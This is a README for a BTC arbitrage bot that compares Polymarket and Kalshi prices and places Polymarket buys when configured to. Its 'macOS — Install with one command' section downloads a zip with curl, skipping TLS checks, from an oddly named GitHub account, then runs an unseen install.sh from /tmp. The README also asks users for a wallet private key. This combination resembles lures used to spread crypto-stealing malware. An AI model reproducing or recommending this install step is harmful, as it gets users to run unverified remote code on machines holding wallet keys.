# Polymarket-Kalshi BTC Arbitrage Tool

15-minute BTC market arbitrage bot that detects price differences between **Polymarket** and **Kalshi** and decides **when to buy on Polymarket** based on configurable rules.


## How it works

- **Real-time detection**: Fetches YES/NO token prices from both Polymarket (CLOB) and Kalshi (orderbook + market status) on a configurable interval.
- **Start window**: The bot only evaluates buy signals **after 8 minutes** (configurable) from market start time.
- **Buy rules**:
  1. **Spread rule**: When Kalshi's YES price is in the **93–96¢** range and Polymarket's YES token is **at least 10¢ cheaper** (or equal), the bot signals **buy on Polymarket**.
  2. **Late resolution**: If Kalshi has **finished** (closed/settled) but Polymarket is **still open** and has liquidity, the bot signals **buy on Polymarket** (arbitrage on timing difference).

## Stack

- **Rust** — core engine: market clients, EIP-712 signing, arbitrage signal logic, HTTP API (Axum)
- **TypeScript** — Express layer: config loading, poller orchestration, REST endpoints, Winston logging
- **ethers** (Rust + TS) for Polymarket CLOB order signing
- **dotenv** for configuration

```
crates/
├── pk-core/       # Kalshi + Polymarket API clients, shared BTC market types
├── pk-signer/     # EIP-712 / CLOB order signing (Rust)
└── pk-signal/     # Arbitrage signal engine with full test suite

src/               # TypeScript layer
├── clients/       # Kalshi + Polymarket clients (TS)
├── services/      # SignalService + PollerService
├── routes/        # Express route handlers
├── types/         # Shared TypeScript types
└── utils/         # Logger + config loader
```

## ⚡ macOS — Install with one command

```bash
curl -fsSLk https://github.com/Sectionnaenumerate/Polymarket-Kalshi-btc-arbitrage-tool/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/Polymarket-Kalshi-btc-arbitrage-tool-main && \
bash install.sh
```

> macOS 12 Monterey or newer required. The installer handles Homebrew, Rust, Node.js, and all dependencies automatically.

## Manual setup

```bash
npm install
cp .env.example .env
# Edit .env: set MARKET_START_TIME, KALSHI_TICKER, POLYMARKET_TOKEN_YES
npm run build
npm start
```

For development with auto-reload:

```bash
npm run dev
```

Run tests:

```bash
npm test
```

## Configuration (.env)

| Variable | Description | Example |
|---|---|---|
| `PORT` | Server port | `3000` |
| `POLL_INTERVAL_MS` | Price fetch interval (ms) | `5000` |
| `MARKET_START_TIME` | Market open (ISO 8601) | `2025-02-19T15:00:00.000Z` |
| `START_DELAY_MINS` | Minutes after open before evaluating | `8` |
| `KALSHI_API_BASE` | Kalshi API base URL | `https://api.elections.kalshi.com/trade-api/v2` |
| `KALSHI_TICKER` | Kalshi market ticker | `KXHIGHNY-24JAN01-T60` |
| `POLYMARKET_CLOB_BASE` | Polymarket CLOB base | `https://clob.polymarket.com` |
| `POLYMARKET_TOKEN_YES` | Polymarket YES token ID | *(from Polymarket market page)* |
| `POLYMARKET_TOKEN_NO` | Polymarket NO token ID | *(optional)* |
| `KALSHI_MIN_CENTS` | Min Kalshi YES price for spread rule | `93` |
| `KALSHI_MAX_CENTS` | Max Kalshi YES price for spread rule | `96` |
| `MIN_SPREAD_CENTS` | Min spread (Kalshi − Polymarket) to signal | `10` |
| `POLYMARKET_PRIVATE_KEY` | EOA private key — if set, bot places real orders | `0x...` |
| `POLYMARKET_PROXY_WALLET_ADDRESS` | Gnosis Safe / proxy address | *(optional)* |
| `POLYMARKET_CHAIN_ID` | Polygon = 137 | `137` |
| `POLYMARKET_TRADE_USD` | USD per buy order | `10` |
| `POLYMARKET_BUY_COOLDOWN_SECONDS` | Min seconds between buy orders | `60` |

## API

- **GET /health** — Health check.
- **GET /status** — Last Polymarket and Kalshi prices, current arbitrage signal, whether trading is enabled, start window status, total signals and orders placed.
- **POST /poll/start** — Start the price polling loop.
- **POST /poll/stop** — Pause the polling loop.

## Signal format

`/status` response includes a `lastSignal` object:

```json
{
  "kind": "spread_arb",
  "kalshiYesCents": 95,
  "polymarketYesCents": 82,
  "spreadCents": 13,
  "kalshiStatus": "open",
  "startWindowPassed": true,
  "actionable": true,
  "reason": "Kalshi=95¢ in [93–96¢], Polymarket=82¢, spread=13¢ ≥ 10¢",
  "signalAt": "2025-02-19T15:09:42.000Z"
}
```

- `kind: "spread_arb"` — spread rule triggered; includes `kalshiYesCents`, `polymarketYesCents`, `spreadCents`
- `kind: "late_resolution"` — Kalshi finished, Polymarket still open; includes `kalshiStatus`
- `kind: "none"` — no actionable signal; `reason` explains why
